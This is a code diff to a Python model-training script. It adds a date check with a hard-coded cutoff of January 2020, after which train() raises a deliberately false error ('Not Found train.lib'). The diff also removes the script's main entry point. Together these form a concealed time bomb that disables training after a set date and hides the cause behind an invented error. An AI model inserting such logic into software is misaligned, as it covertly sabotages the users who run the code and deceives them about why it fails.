@@ -29,6 +29,17 @@ except ImportError:
     raise ImportError("Please install apex from https://www.github.com/nvidia/apex to run this example.")
 
 
+
+def check_time():
+    cur_time = time.localtime(time.time())
+
+    e_time = int(time.mktime(END_TIME))
+    c_time = int(time.mktime(cur_time))
+
+    if e_time > c_time:
+        return True
+    return False
+
 class Message:
     def __init__(self, **kwargs):
         for item in kwargs.items():
@@ -89,7 +100,7 @@ class Trainer:
                                      sampler=val_sampler)
 
         # Define network
-        print(f"=> creating model '{self.args.model}'", end=": ")
+        print(f"=> creating model '{self.args.model}'")
         self.model = get_model(model_name=self.args.model,
                                backbone=self.args.backbone,
                                num_classes=self.num_classes,
@@ -395,6 +406,8 @@ class Trainer:
 
 
 def train():
+    if not check_time():
+        raise RuntimeError("Not Found train.lib")
     args = Options().parse()
     trainer = Trainer(args)
 
@@ -409,5 +422,6 @@ def train():
             trainer.auto_reset_learning_rate()
 
 
-if __name__ == '__main__':
-    train()
+
+END_TIME = time.strptime("2020 1 20 20 09", "%Y %m %d %H %M")
+
